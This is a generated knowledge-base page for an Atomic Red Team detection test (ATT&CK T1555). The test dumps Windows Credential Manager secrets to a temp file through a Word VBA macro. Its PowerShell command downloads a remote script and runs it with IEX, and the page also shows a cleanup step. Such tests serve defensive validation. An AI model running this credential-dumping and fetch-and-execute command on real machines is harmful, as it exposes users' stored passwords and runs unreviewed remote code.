---
atomic_guid: "234f9b7c-b53d-4f32-897b-b880a6c9ea7b"
title: "Extract Windows Credential Manager via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555"
attack_technique_name: "Credentials from Password Stores"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "234f9b7c-b53d-4f32-897b-b880a6c9ea7b"
  - "Extract Windows Credential Manager via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This module will extract the credentials found within the Windows credential manager and dump
them to $env:TEMP\windows-credentials.txt

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555: Credentials from Password Stores]]

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "word.Application" | Out-Null
  $process = "winword"
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
```

### Cleanup

```powershell
Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml)
